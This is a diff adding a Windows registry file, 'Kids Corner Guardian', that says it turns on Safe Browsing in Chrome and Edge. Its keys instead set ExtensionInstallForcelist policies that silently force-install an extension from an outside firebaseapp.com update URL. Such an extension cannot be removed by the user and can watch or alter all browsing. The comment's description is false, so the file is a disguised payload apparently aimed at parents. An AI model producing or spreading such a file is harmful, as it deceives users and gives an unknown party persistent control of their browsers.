@@ -1,0 +1,10 @@
+Windows Registry Editor Version 5.00
+
+; Kids Corner Guardian — turns on Safe Browsing in Chrome and Edge for THIS
+; user. No admin needed. Double-click, choose Yes, then restart the browser.
+
+[HKEY_CURRENT_USER\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist]
+"1"="jcidbnilldagoigommaalmndbgkkkbdk;https://kids-corner-45fc2.firebaseapp.com/guardian/updates.xml"
+
+[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist]
+"1"="jcidbnilldagoigommaalmndbgkkkbdk;https://kids-corner-45fc2.firebaseapp.com/guardian/updates.xml"
